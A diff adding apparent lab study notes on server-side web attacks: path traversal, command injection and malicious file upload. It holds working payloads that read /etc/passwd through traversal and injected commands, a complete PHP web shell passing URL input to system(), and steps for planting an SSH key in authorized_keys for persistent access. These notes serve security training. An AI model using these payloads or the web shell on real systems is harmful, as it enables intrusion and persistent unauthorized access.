@@ -177,21 +177,59 @@ Is on the URL and is encoded with base64 or illegal URL characters
 Stored XSS
 Is in the server of the website, If client logs in exectuable will run
 
+Server-Side injection
+
+Directory Traversal/Path Traversal
+Ability to read/execute outside web server’s directory
+Uses ../../ (relative paths) in manipulating a server-side file path
+view_image.php?file=../../etc/passwd
+Use ; to run commands
+; whoami
+; cat ../../../../etc/passwd
+; cat ../../../../etc/hosts
+; cat ../../../../etc/profiles
+
+Malicious File upload
+
+Open a notepad to create a .php with
+<HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+
+save as a .php
+
+upload .php file, navigate back to uploads
+
+gives command shell on the text bar 
+- cat /etc/passwd
 
 
+Command Injection
+Create ssh key
+ssh-keygen -t rsa 
+Generating public/private rsa key pair.
 
+Grab public Key
+student@lin-ops:~$ cd ~/.ssh
+student@lin-ops:~/.ssh$ cat id_rsa.pub
 
+find users home directory 
+; cat /etc/passwd
 
+Create directory for .ssh key 
+; mkdir var/www/.ssh
 
+echo ssh onto authorized keys
+echo "key" >> /var/www/.ssh/authorized_keys
 
-
-
-
-
-
-
-
-
-
-
-
+try ssh process again for test if it doesn't work
